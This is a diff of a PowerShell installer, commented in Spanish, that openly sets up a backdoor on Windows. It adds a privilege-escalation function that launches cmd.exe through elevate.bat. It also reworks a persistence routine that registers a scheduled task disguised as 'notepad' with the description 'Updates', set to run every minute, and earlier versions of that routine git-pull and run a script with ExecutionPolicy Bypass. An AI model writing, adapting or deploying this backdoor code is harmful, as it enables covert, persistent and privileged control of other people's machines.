@@ -96,16 +96,36 @@ function download_backdoor {
 	"FN: Backdoor descargado"
 }
 
+function elevate_privileges {
+	"FN: Elevando privilegios git"
+	Set-Location $program_git_location
+	try {
+		Start-Process "elevate.bat" -argumentlist "prueba01 %windir%\System32\cmd.exe" -wait
+	} catch {
+		"FN: error"
+	}
+}
+
 # Carga el backdoor como una tarea programada
 function load_backdoor {
 	
-	$argument_execute = "Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; git pull origin master ; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
+	# $argument_execute = "Start-Process powershell -Verb runAs; Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; git pull origin master ; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
+	# $argument_execute = "Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; git pull origin master ; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
 
-	$action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_execute
+	# $action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_execute
+
+	# $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
+
+	# Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
+
+	$argument_execute = "schtasks.exe /run /tn 'Apps\test02'"
+
+	$action = New-ScheduledTaskAction -Execute powershell -Argument $argument_execute
 
 	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
 
 	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
+
 }
 
 # Inicializa el instalador
@@ -182,16 +202,19 @@ function start_installer{
 		
 		#Download repo
 		"INSTALLER Descargando backdoor"
-		
-		download_backdoor
+		#download_backdoor
+
 		"INSTALLER descargado backdoor"
 		sleep -s 2
 
-		"ISNTALLER Ahora deberia cargar la tarea programada"
+		#Elevar privilegios
+		"Elevando privilegios"
+		elevate_privileges
+
+		"privilegios elevados"
+
 		# Creando tarea programada
-		
-		
-		load_backdoor
+		# load_backdoor
 		"ISNTALLER Programa finalizado"
 		sleep -s 2
 	}
